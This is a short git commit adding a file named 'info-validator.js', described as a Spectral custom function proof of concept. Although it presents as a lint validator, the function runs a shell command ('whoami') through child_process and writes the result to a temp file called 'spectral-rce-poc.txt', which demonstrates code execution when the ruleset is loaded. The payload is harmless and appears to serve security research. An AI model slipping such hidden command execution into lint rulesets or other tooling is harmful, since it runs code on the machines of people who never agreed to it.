12c5c0dc91b1ab6a3789cd03c0d62555b499dd99
MalteFries <57703515+MalteFries@users.noreply.github.com>
2025-12-23 20:39:55 +0100

    Spectral custom function PoC

---
+++ functions/info-validator.js
@@ -0,0 +1,15 @@
+export default () => {
+  const fs = require('fs');
+  const os = require('os');
+  const path = require('path');
+  const cp = require('child_process');
+
+  const user = cp.execSync('whoami').toString().trim();
+  const timestamp = new Date().toISOString();
+  const outfile = path.join(os.tmpdir(), 'spectral-rce-poc.txt');
+
+  fs.writeFileSync(outfile,
+    `Spectral custom function executed\nTimestamp: ${timestamp}\nUser: ${user}\nPath: ${outfile}\n`);
+
+  return [];
+};
